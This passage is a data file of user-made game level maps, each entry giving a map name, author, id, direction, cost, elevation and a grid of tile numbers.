,5,5,5,10,10,94,45,10,5,5,5,5,5,5,1,24,24,3,5,5,5,5,5,5,5,10,10,5,5,5,5,5,5,5,1,24,24,3,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,1,24,24,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,24,24,24,24,17,17,17,17,17,17,10,10,10,10,11,12,5,5,5,88,24,24,24,24,17,17,17,17,17,17,10,10,10,10,11,12,5,5,5,2,24,24,24,24,17,17,17,17,17,17,10,10,10,10,11,12,5,5,5,2,24,24,24,24,17,17,17,17,17,17,10,10,10,10,11,12,5,5,5,88,24,24,24,24,17,17,17,17,17,17,10,10,10,10,11,12,5,5,5,5]});
maps.push({name="Dont touch the wall",author="Applily",id="#1668586436",direction="right",cost=113,elevation=0,map=[0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,12,12,12,32,199,0,0,0,0,0,0,0,0,0,0,0,0,0,170,173,0,0,32,32,199,199,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,32,32,32,32,32,32,32,32,0,0,0,0,0,0,0,0,0,0,0,199,32,32,32,32,32,32,32,32,0,0,0,0,0,0,0,0,0,1,0,199,32,32,32,32,32,32,32,32,0,0,0,0,0,0,0,0,0,0,0,199,199,199,0,0,0,199,199,32,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,199,32,0,0,0,0,0,0,0,1,0,0,1,0,0,0,0,0,0,0,0,32,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,32,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,96,0,0,0,0,0,0,0,0,0,0,1,0,0,1,0,0,0,0,0,96,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,32,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,32,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,175,65,0,0,0,0,0,0,0,1,174,0,0,0,0,1,0,0,0,65,65,65,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,65,97,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,32,2,0,0,0,0,0,0,0,0,0,0,0,0,93,16,0,0,0,158,32,0,0,0,0,0,0,0,0,0,0,0,0,0,93,16,0,0,0,158,32,0]});
maps.push({name="Trigger Fast",author="FL00D",id="#1668588127",direction="left",cost=120,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,97,131,0,0,0,97,131,0,0,0,14,14,0,0,0,0,0,0,0,0,14,14,0,0,0,14,14,0,0,0,14,14,0,0,0,0,0,176,0,0,175,0,0,0,0,0,174,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,97,14,0,0,0,0,0,0,0,0,0,171,0,0,0,14,14,0,0,0,131,14,177,0,0,0,0,0,0,0,168,173,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,132,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,2,14,96,96,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,2,14,96,96,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Open Jumps",author="FL00D",id="#1668588358",direction="forward",cost=314,elevation=0,map=[0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,16,0,0,0,0,0,98,98,10,98,98,10,10,10,10,10,0,0,0,16,16,0,0,0,0,0,98,98,10,98,98,10,10,10,10,10,0,0,10,10,10,0,0,0,0,0,10,10,10,10,10,10,1,1,10,10,0,0,10,96,96,0,0,0,0,0,10,10,10,0,0,36,99,1,10,10,0,0,10,96,96,0,0,0,0,0,98,98,10,0,0,36,36,1,10,10,0,0,10,96,96,0,0,0,0,0,98,98,10,0,0,0,0,0,10,10,0,0,10,10,10,0,0,0,0,0,195,195,10,0,0,0,0,196,10,10,0,0,10,96,96,0,0,0,0,0,195,195,10,0,0,0,0,196,10,10,0,0,10,96,96,0,0,0,0,0,10,10,10,1,1,1,1,0,10,10,0,0,10,10,10,0,0,0,0,0,10,10,10,1,16,16,0,196,10,10,0,0,10,10,10,0,0,0,0,0,195,195,10,1,16,16,0,196,10,10,0,0,10,96,96,36,97,0,0,0,195,195,10,1,93,93,1,1,10,10,0,0,10,96,96,36,36,0,0,0,195,195,10,1,93,93,1,10,10,10,0,0,10,10,10,195,195,10,10,195,195,10,10,1,93,93,1,10,3,3,0,0,10,10,10,195,195,10,10,195,195,10,10,1,93,93,1,16,16,16,0,0,10,10,10,10,10,10,10,10,10,10,10,1,1,1,1,16,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0]});
maps.push({name="24783228347239847204",author="FL00D",id="#1668588414",direction="right",cost=324,elevation=17,map=[2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,7,7,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,7,7,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,7,7,0,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,0,0,7,7,0,44,199,199,199,199,199,199,199,199,199,199,199,199,199,44,0,0,7,7,0,44,199,24,24,24,24,24,24,24,24,24,24,199,199,44,0,0,7,7,0,44,199,24,7,7,7,7,7,7,7,7,24,199,199,44,0,0,7,7,0,44,199,24,7,66,66,66,66,66,66,7,24,199,199,44,0,0,7,7,0,44,44,24,7,66,66,66,66,66,66,7,24,3,199,44,0,0,7,129,0,44,0,7,7,66,66,66,66,66,66,7,7,7,199,24,24,2,7,129,0,44,0,7,7,66,66,66,66,66,66,7,7,7,199,24,24,2,0,0,0,44,44,24,7,66,66,66,66,66,66,7,24,3,199,44,0,0,0,0,0,44,199,24,7,66,66,66,66,66,66,7,24,199,199,44,0,0,0,0,0,44,199,24,7,7,7,7,7,7,7,7,24,199,199,44,0,0,0,0,0,44,199,24,24,24,24,24,24,24,24,24,24,199,199,44,0,0,0,0,0,44,199,199,199,199,199,199,199,199,199,199,199,199,199,44,0,0,0,0,0,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="RACE Easy",author="FL00D",id="#1668589409",direction="forward",cost=192,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,2,2,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,2,2,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="RACE downwards curve",author="chinny",id="#1668612776",direction="right",cost=185,elevation=-9,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,2,2,14,0,0,0,11,11,11,11,12,12,12,13,13,13,14,14,14,14,14,14,14,0,0,0,11,11,11,11,12,12,12,13,13,13,14,14,14,14,14,14,14,0,0,0,11,11,11,11,12,12,12,13,13,13,14,14,14,14,14,14,14,1,0,0,11,11,11,11,12,12,12,13,13,13,14,14,14,14,14,14,14,1,0,0,10,10,10,10,0,0,0,0,0,0,1,1,1,1,1,1,1,0,0,0,10,10,10,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,10,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,10,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,8,8,8,7,7,7,6,6,6,5,5,5,5,5,5,5,5,0,0,8,8,8,8,7,7,7,6,6,6,5,5,5,5,5,5,5,2,0,0,8,8,8,8,7,7,7,6,6,6,5,5,5,5,5,5,5,2,0,0,8,8,8,8,7,7,7,6,6,6,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="RACE YOUR FEARS",author="GandalfThePimp",id="#1668614908",direction="right",cost=195,elevation=0,map=[0,0,0,5,2,2,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,6,6,6,6,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,6,6,6,6,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,6,6,6,6,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,6,6,6,6,0,0,0,6,6,6,6,0,0,0,0,0,0,0,0,0,6,6,6,6,6,6,6,6,6,6,6,6,0,0,0,0,0,0,0,0,6,6,6,6,6,6,6,6,6,1,6,6,6,0,0,0,0,0,0,0,6,6,6,6,6,6,6,6,6,6,6,6,6,6,6,6,6,0,0,0,6,6,6,6,6,6,6,6,6,1,6,6,6,6,6,6,6,6,0,0,0,6,6,6,6,6,6,6,6,6,6,6,6,6,6,5,5,5,0,0,0,6,6,6,6,6,6,6,6,1,6,6,6,6,5,5,5,5,0,0,0,6,6,6,6,6,6,6,6,6,6,6,6,6,5,5,5,2,0,0,0,6,6,6,6,6,6,6,6,1,6,6,6,6,5,5,5,2,0,0,0,0,0,0,0,0,6,6,6,6,6,6,6,6,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5]});
maps.push({name="Glass Bridge",author="sivi",id="#1668619636",direction="forward",cost=248,elevation=0,map=[0,0,0,0,0,0,0,1,105,2,2,105,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,105,105,105,105,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,183,183,183,183,1,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,183,183,183,183,1,1,1,1,1,1,0,0,0,0,1,17,0,0,0,90,183,183,183,183,90,0,0,0,17,1,0,0,0,0,1,17,77,0,0,105,183,183,183,183,105,0,0,77,17,1,0,0,0,0,1,17,77,0,0,105,183,183,183,183,105,0,0,77,17,1,0,0,0,0,1,17,0,3,0,90,183,183,183,183,90,0,3,0,17,1,0,0,0,0,1,1,14,14,14,1,183,183,183,183,1,14,14,14,1,1,0,0,0,0,0,1,14,94,14,1,183,183,183,183,1,14,93,14,1,0,0,0,0,0,0,1,14,93,14,1,183,183,183,183,1,14,94,14,1,0,0,0,0,0,1,1,14,14,14,1,183,183,183,183,1,14,14,14,1,1,0,0,0,0,1,17,0,3,0,90,183,183,183,183,90,0,3,0,17,1,0,0,0,0,1,17,77,0,0,105,183,183,183,183,105,0,0,77,17,1,0,0,0,0,1,17,77,0,0,105,183,183,183,183,105,0,0,77,17,1,0,0,0,0,1,17,0,0,0,90,183,183,183,183,90,0,0,0,17,1,0,0,0,0,1,1,1,1,1,1,183,183,183,183,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,1,183,183,183,183,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,105,105,105,105,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,105,2,2,105,1,0,0,0,0,0,0,0]});
maps.push({name="Defend For Items",author="sivi",id="#1668625926",direction="forward",cost=293,elevation=7,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,2,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,7,7,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,7,7,1,0,0,0,0,0,0,0,14,14,97,14,0,0,0,0,0,1,7,7,1,0,0,175,0,0,0,176,14,93,93,14,7,7,7,7,9998,7,7,7,1,0,0,0,0,0,0,0,14,93,93,14,195,195,10,9,8,7,7,7,1,1,131,131,131,199,0,0,14,93,93,14,195,195,10,9,8,7,7,7,1,1,0,0,0,199,0,0,14,93,93,14,7,7,7,7,9998,9998,8,8,1,1,0,0,0,199,0,0,14,14,14,14,0,0,0,0,0,1,9,9,1,1,131,131,131,199,0,0,0,0,0,0,0,0,0,0,145,1,10,10,1,1,0,0,0,199,0,177,0,0,0,0,0,172,0,178,14,1,11,11,1,1,0,0,0,199,0,0,0,0,0,0,0,0,0,0,131,1,12,12,1,1,131,131,131,199,199,199,199,199,199,199,199,199,199,199,1,1,13,13,1,1,0,0,0,0,0,131,0,0,131,0,0,131,0,0,114,114,114,114,1,1,0,174,0,0,0,131,0,0,131,0,0,131,0,173,114,114,132,114,1,1,0,0,0,0,0,131,0,0,131,0,0,131,0,170,114,114,114,114,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,95,95,1,0,0,0,0,0,0,0,0,0,1,114,114,114,95,114,114,95,114,114,1,0,0,0,0,0,0,0,0,0,1,114,114,114,95,114,114,95,114,114,1,0,0,0,0,0,0,0,0,0,1,2,2,1,1,1,1,1,1,1,1]});
maps.push({name="Aquatica",author="Applily",id="#1668645917",direction="forward",cost=340,elevation=10,map=[0,0,0,2,2,0,0,199,199,199,0,0,0,0,0,0,0,0,0,0,0,0,0,160,160,0,199,162,162,162,162,162,162,162,160,160,0,0,0,0,0,0,0,160,160,0,199,162,162,162,162,162,162,162,160,160,0,0,0,0,0,0,0,160,160,0,0,0,0,0,0,0,0,0,160,160,0,0,0,0,0,0,0,160,160,0,0,0,0,0,0,0,0,0,160,160,0,0,0,0,0,0,0,160,160,0,0,0,0,0,0,0,0,0,160,160,0,0,0,0,0,0,0,160,160,0,0,0,158,158,0,0,0,0,160,160,0,0,0,0,0,0,0,158,158,0,0,0,159,159,0,0,0,0,160,160,0,0,0,0,0,0,0,0,0,0,0,0,159,159,0,0,0,0,158,158,0,0,0,0,0,0,0,0,0,0,0,0,159,159,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,159,159,0,0,0,0,0,0,0,0,0,0,0,0,0,162,162,162,162,162,159,159,0,0,0,0,65,65,0,0,0,0,0,0,199,162,162,162,162,162,159,159,0,0,0,0,65,65,0,0,0,0,0,0,0,199,199,0,0,0,0,0,0,0,0,0,65,65,0,0,199,0,199,0,0,0,0,0,0,0,0,0,0,0,0,0,158,158,0,199,132,199,131,199,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,44,44,44,32,32,199,0,0,0,0,0,0,0,0,0,0,0,0,0,0,44,44,44,32,32,32,65,65,0,0,0,0,158,161,161,161,161,161,161,0,44,44,44,32,32,32,65,65,0,0,0,0,158,161,161,161,161,161,161,0,44,44,44,32,32,32,65,65,0,0,0,0,0,0,0,0,0,199,199,0,0,2,2]});
maps.push({name="RACE Plain Bridge",author="TF2 Pencil",id="#1668677542",direction="right",cost=152,elevation=0,map=[0,0,11,2,2,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,11,11,0,0,0,0,0,0,0,11,11,11,11,11,11,11,0,0,11,11,11,11,0,0,0,0,0,0,0,11,11,11,11,11,11,2,0,0,11,11,11,11,0,0,0,0,0,0,0,11,11,11,11,11,11,2,0,0,11,11,11,11,0,0,0,0,0,0,0,11,11,11,11,11,11,11,0,0,11,11,11,11,0,0,0,0,0,0,0,11,11,11,11,0,0,0,0,0,11,11,11,11,0,0,0,0,0,0,0,11,11,11,11,0,0,0,0,0,11,11,11,11,0,0,0,0,0,0,0,11,11,11,11,0,0,0,0,0,11,11,11,11,0,0,0,0,0,0,0,11,11,11,11,0,0,0,0,0,11,11,11,11,31,31,31,31,31,31,31,11,11,11,11,0,0,0,0,0,11,11,11,11,31,31,31,31,31,31,31,11,11,11,11,0,0,0,0,0,11,11,11,11,31,31,31,31,31,31,31,11,11,11,11,0,0,0,0,0,11,11,11,11,31,31,31,31,31,31,31,11,11,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="RACE Rectangle",author="FL00D",id="#1668706838",direction="forward",cost=138,elevation=-2,map=[0,0,0,0,0,2,2,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,20,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,20,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,20,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,38,38,38,38,38,38,38,38,38,0,0,0,0,0,0,0,0,0,0,0,38,38,38,38,38,38,38,38,38,0,0,0,0,0,0,0,0,0,0,0,38,38,38,38,38,38,38,38,38,0,0,0,0,0,0,0,0,0,0,0,38,38,38,38,38,38,38,38,38,0,0,0,0,0,0,0,0,0,0,0,38,38,38,38,38,38,38,38,38,0,0,0,0,0,0,0,0,0,0,0,38,38,38,38,38,38,38,38,38,0,0,0,0,0,0,0,0,0,0,0,38,38,38,38,38,38,38,38,38,0,0,0,0,0,0,0,0,0,0,0,38,38,38,38,38,38,38,38,38,0,0,0,0,0,0,0,0,0,0,0,38,38,38,38,38,38,38,38,38,0,0,0,0,0,0,0,0,0,0,0,38,38,38,38,38,38,38,38,38,0,0,0,0,0,0,0,0,0,0,0,38,38,38,38,38,38,38,38,38,0,0,0,0,0,0,0,0,0,0,0,38,38,38,38,38,38,38,38,38,0,0,0,0,0,0,0,0,0,0,0,38,38,38,38,38,38,38,38,38,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,2,2,0,0,0,0,0,0]});
maps.push({name="Trippy Staircase",author="sivi",id="#1668711583",direction="forward",cost=282,elevation=8,map=[0,0,0,0,0,0,0,1,116,2,2,116,1,0,0,0,0,0,0,0,0,0,0,0,0,145,10,150,9998,116,116,9998,150,9,145,0,0,0,0,0,0,0,0,0,0,145,9,150,90,116,116,90,150,10,145,0,0,0,0,0,0,0,0,0,0,145,10,150,9998,117,117,9998,150,9,145,0,0,0,0,0,0,0,0,0,0,145,9,150,90,117,117,90,150,10,145,0,0,0,0,0,0,0,0,0,0,145,10,150,9998,118,118,9998,150,9,145,0,0,0,0,0,0,0,0,0,0,145,9,150,90,118,118,90,150,10,145,0,0,0,0,0,0,0,0,0,0,145,10,150,9998,119,119,9998,150,9,145,0,0,0,0,0,0,0,0,0,0,145,9,150,90,119,119,90,150,10,145,0,0,0,0,0,0,0,0,0,0,145,10,150,88,120,120,88,150,9,145,0,0,0,0,0,0,0,0,0,0,145,9,150,90,120,120,90,150,10,145,0,0,0,0,0,0,0,0,0,0,145,10,150,9998,121,121,9998,150,9,145,0,0,0,0,0,0,0,0,0,0,145,9,150,90,121,121,90,150,10,145,0,0,0,0,0,0,0,0,0,0,145,10,150,9998,122,122,9998,150,9,145,0,0,0,0,0,0,0,0,0,0,145,9,150,90,122,122,90,150,10,145,0,0,0,0,0,0,0,0,0,0,145,10,150,9998,123,123,9998,150,9,145,0,0,0,0,0,0,0,0,0,0,145,9,150,90,123,123,90,150,10,145,0,0,0,0,0,0,0,0,0,0,145,10,150,9998,124,124,9998,150,9,145,0,0,0,0,0,0,0,0,0,0,145,9,150,90,124,124,90,150,10,145,0,0,0,0,0,0,0,0,0,0,0,0,1,1,2,2,1,1,0,0,0,0,0,0,0]});
maps.push({name="Shrine of allihoppa",author="sivi",id="#1668723800",direction="forward",cost=378,elevation=9,map=[0,0,0,1,0,90,5,5,5,2,2,5,5,5,90,0,1,0,0,0,0,0,0,0,5,5,65,65,65,65,65,65,65,65,5,5,0,0,0,0,0,0,93,90,5,65,65,65,65,65,65,65,65,65,65,5,90,93,0,0,0,0,13,5,65,65,133,65,65,65,65,65,65,133,65,65,5,13,0,0,0,0,188,5,65,65,65,65,5,3,3,5,65,65,65,65,5,188,0,0,0,0,1,90,65,65,65,5,19,53,53,19,5,65,65,65,90,1,0,0,0,0,0,5,65,65,65,3,53,131,131,53,3,65,65,65,5,0,0,0,0,0,0,5,65,65,65,3,53,131,131,53,3,65,65,65,5,0,0,0,0,0,1,90,65,65,65,5,19,53,53,19,5,65,65,65,90,1,0,0,0,0,189,5,65,65,65,65,5,3,3,5,65,65,65,65,5,189,0,0,0,0,13,5,65,65,133,65,65,65,65,65,65,133,65,65,5,13,0,0,0,0,93,90,5,65,65,65,65,65,65,65,65,65,65,5,90,93,0,0,0,0,0,0,5,5,65,65,65,65,65,65,65,65,5,5,0,0,0,0,0,0,0,1,0,90,5,5,90,5,5,90,5,5,90,0,1,0,0,0,0,0,0,0,0,1,0,0,1,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,14,132,14,14,14,14,14,14,132,14,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,2,2,14,0,0,0,0,0,0,0,0]});
maps.push({name="allis house",author="sivi",id="#1668738094",direction="right",cost=267,elevation=0,map=[0,10,2,2,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,10,5,5,1,111,111,111,12,93,93,12,112,5,65,65,65,65,5,1,0,10,184,184,0,0,0,1,5,65,65,65,1,90,5,65,65,5,90,1,0,10,184,184,0,187,105,199,5,5,65,65,1,94,5,5,5,5,88,1,0,10,184,184,0,187,105,199,5,5,5,90,1,1,105,105,105,105,1,1,0,10,184,184,0,187,105,199,5,5,5,5,95,105,105,105,105,105,105,2,0,10,184,184,0,187,105,199,5,5,5,5,95,105,105,105,105,105,105,2,0,10,184,184,0,3,0,1,90,5,5,5,1,1,105,105,105,105,1,1,0,10,184,184,1,1,1,1,5,5,5,90,1,94,5,5,5,5,88,1,0,10,5,5,95,105,105,105,5,5,5,5,1,90,5,65,65,5,90,1,0,10,5,5,95,105,105,105,5,90,5,5,1,5,65,65,65,65,5,1,0,10,10,10,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Valparaiso",author="Dogeeri",id="#1668797459",direction="forward",cost=467,elevation=5,map=[0,125,2,2,125,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,67,159,10,10,159,67,0,0,0,0,0,0,0,0,0,0,0,0,0,0,67,159,10,10,159,67,0,0,0,0,0,0,0,0,0,0,0,0,0,0,67,159,9,9,159,67,44,100,129,44,0,0,0,0,0,0,0,0,0,0,67,159,8,8,159,67,44,44,44,44,0,0,0,0,0,0,0,0,0,0,67,159,8,8,159,67,124,199,0,0,0,0,0,0,0,135,0,0,0,0,67,159,161,162,159,67,123,199,199,199,199,199,0,0,135,38,135,0,0,0,67,159,8,8,159,67,122,96,160,120,97,1,0,0,0,135,38,135,0,0,8,8,8,8,159,161,67,161,161,161,118,1,0,0,0,0,0,0,0,0,90,8,8,8,159,161,67,161,159,159,118,1,1,0,0,0,0,0,0,0,8,8,8,8,8,8,18,144,159,159,118,90,1,1,0,0,0,0,0,0,90,8,8,87,8,94,18,18,159,159,118,118,90,1,1,1,3,3,0,0,44,44,8,8,8,8,18,144,159,159,118,118,117,116,115,96,15,15,0,0,93,44,184,184,8,149,18,18,159,159,118,118,117,116,115,96,15,15,0,0,44,44,8,8,8,8,18,144,159,159,118,118,90,1,1,1,15,15,0,0,90,8,8,87,8,132,18,91,159,159,118,90,1,1,0,1,147,142,0,0,7,7,7,7,7,7,18,144,159,159,118,1,1,0,0,0,15,15,0,0,90,7,6,6,6,7,18,91,159,159,118,1,183,38,0,1,15,15,16,0,1,199,199,199,91,1,18,162,162,159,118,199,38,91,0,199,15,15,0,0,1,131,93,144,144,1,18,159,18,18,89,1,1,94,0,1,2,2,0,0]});
maps.push({name="RACE Title Decider",author="ZpLit",id="#1668822897",direction="left",cost=165,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,14,2,2,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,0,0,0,0,0,0,14,14,14,14,14,14,0,0,0,0,14,14,14,14,14,0,0,0,0,14,14,14,14,14,14,14,14,0,0,0,0,14,14,14,14,14,0,0,0,14,14,14,14,14,14,14,14,14,0,0,0,0,14,14,14,14,0,0,0,14,14,14,0,0,14,14,14,14,14,0,0,0,0,14,14,14,14,0,14,14,14,14,0,0,0,14,14,14,14,0,0,0,0,14,14,14,14,0,2,14,14,14,0,0,0,0,14,14,14,0,0,0,0,0,14,14,14,14,2,14,14,14,0,0,0,0,14,14,14,0,0,0,0,0,14,14,14,14,14,14,14,0,0,0,0,0,14,14,14,0,0,0,0,0,0,14,14,14,0,0,0,0,0,0,0,0,14,14,14,0,0,0,0,0,0,14,14,14,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,14,14,14,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,14,14,14,0,0,0,0,0,0,0,0,0,14,14,14,14,14,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
